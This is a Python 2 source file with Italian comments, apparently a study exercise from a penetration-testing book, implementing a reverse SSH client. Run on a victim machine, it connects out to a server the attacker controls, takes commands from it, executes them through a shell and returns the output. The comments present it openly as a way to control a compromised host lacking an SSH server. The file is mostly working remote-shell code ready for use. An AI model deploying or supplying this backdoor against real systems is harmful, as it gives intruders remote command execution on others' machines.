# bhp_reverse_ssh.py

# Nel codice sorgente precedente bhp_ssh.py, abbiamo visto come
# creare un client ssh in Python che si connette ad un Server SSH
# ed esegue il comando indicato, stampandone il risultato su
# linea di comando prima di terminare.

# Approfondiamo l'esempio precedente implementando un client SSH
# reverse. Nella maggior parte dei casi infatti potrebbe non essere
# presente un Server SSH sulle macchine penetrare, e la soluzione
# e' di eseguire sulla macchina sotto attacco un client SSH che si
# connette ad un Server SSH (in esecuzione su una nostra macchina)
# esegue i comandi sul client, e invia gli output al Server.
# Ricordiamoci infatti che per eseguire un Server SSH potremmo
# aver bisogno di privilegi elevati, e non sempre e' facile
# ottenerli durante un test di penetrazione.
# In questo modo si esegue una connessione detta reverse, dove noi
# fungiamo da Server e la vittima e' un client che si connette a noi.

import sys
import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
        client = paramiko.SSHClient()
        # client.load_host_keys('/home/justin/.ssh/known_hosts')
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username = user, password = passwd)

        ssh_session = client.get_transport().open_session()

        if ssh_session.active:
		ssh_session.send(command)
		# Lettura del banner: spesso molti Server SSH inviano un primo
		# messaggio quando avviene la connessione, detto banner.
		print(ssh_session.recv(1024))

		while True:
			# ricezione del comando dal Server SSH.
			command = ssh_session.recv(1024)
			try:
				# Esecuzione del comando e invio dell'output al Server.
				cmd_output = subprocess.check_output(command, shell=True)
				ssh_session.send(cmd_output)
			except Exception,e:
				ssh_session.send(str(e))
		client.close()

        return

def usage():
        print("Usage python bhp_reverse_ssh.py [ip] [user] [password] ClientConnected")
        print("Example python bhp_reverse_ssh.py 192.168.1.1 justin lovethepython ClientConnected")

def main():
        if not len(sys.argv) == 5:
                usage()
                sys.exit(0)

        ssh_command(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
main()
